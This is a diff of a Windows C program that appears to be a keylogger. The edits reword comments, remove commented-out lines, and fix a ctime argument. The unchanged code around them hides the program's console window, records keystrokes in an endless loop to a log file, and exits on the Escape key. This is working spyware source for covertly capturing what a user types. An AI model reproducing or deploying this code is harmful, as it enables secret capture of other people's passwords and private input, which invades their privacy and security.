@@ -32,15 +32,14 @@ int main(){
     time_t t;
     t = time(NULL);
 
-    // Hide the window
+    // To hide the window.
     HWND window;
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
 
-    // file = fopen(PATH, "a+");
     file = fopen(PATH, "ab");
-    // fprintf(file, "\nStarted Logging at %s", ctime(&time));
+    
     fprintf(file, "\nStarted Logging at %s", ctime(&t));
 
     while(1)
@@ -70,7 +69,7 @@ int main(){
                     fputc(capture, file); // Put any other inputted key into the file.
             }
 
-            if ((int)capture == 27){  // The escape key. You can change this to anything you want.
+            if ((int)capture == 27){  // Escape key. Can be changed to anything else as well.
                 fclose(file);
                 return 0;
             }
